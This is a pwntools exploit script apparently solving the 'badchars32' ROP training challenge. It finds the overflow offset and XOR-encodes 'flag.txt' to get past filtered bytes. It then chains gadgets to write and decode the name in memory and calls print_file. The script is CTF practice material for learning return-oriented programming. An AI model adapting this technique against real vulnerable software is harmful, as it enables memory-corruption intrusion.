#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.pc, alphabet="bcdefhjiklmn")
    return ip_offset

exe = './badchars32'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

# crafting the payload
offset = find_offset(cyclic(100, alphabet="bcdefhjiklmn"))
info(f"Offset: {offset:x}")

xor_key = 5
file_name = "flag.txt"
xor_flag = xor(b'flag', xor_key)
xor_txt = xor(b'.txt', xor_key)
info(f"File Name: {xor_flag + xor_txt}")


data_section = elf.get_section_by_name('.data').header.sh_addr
info(f"Data Section Address: {data_section:x}")

pop_data = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
info(f"Pop Data: {pop_data:x}")

pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]
info(f"Pop EBP: {pop_ebp:x}")

pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
info(f"Pop EBX: {pop_ebx:x}")

xor_gadget = elf.symbols.usefulGadgets + 0x04

mov_gadget = elf.symbols.usefulGadgets + 0x0c
info(f"Move Gadget: {mov_gadget:x}")

xor_xploit = b""
addr_offset = 0

for _ in file_name:
    xor_xploit += pack(pop_ebp)
    xor_xploit += pack(data_section + addr_offset)
    xor_xploit += pack(pop_ebx)
    xor_xploit += pack(xor_key)
    xor_xploit += pack(xor_gadget)
    addr_offset += 1

payload = flat({ offset: [
        pop_data,
        xor_flag,
        data_section,
        0,
        mov_gadget,
        pop_data,
        xor_txt,
        data_section + 0x04,
        0,
        mov_gadget,
        xor_xploit,
        elf.symbols.print_file,
        elf.symbols.main,
        data_section
    ] })

write('payload', payload)
info(f"Payload: {payload}")

# executing the payload
io = start()
io.sendlineafter(b'>', payload)
io.interactive()
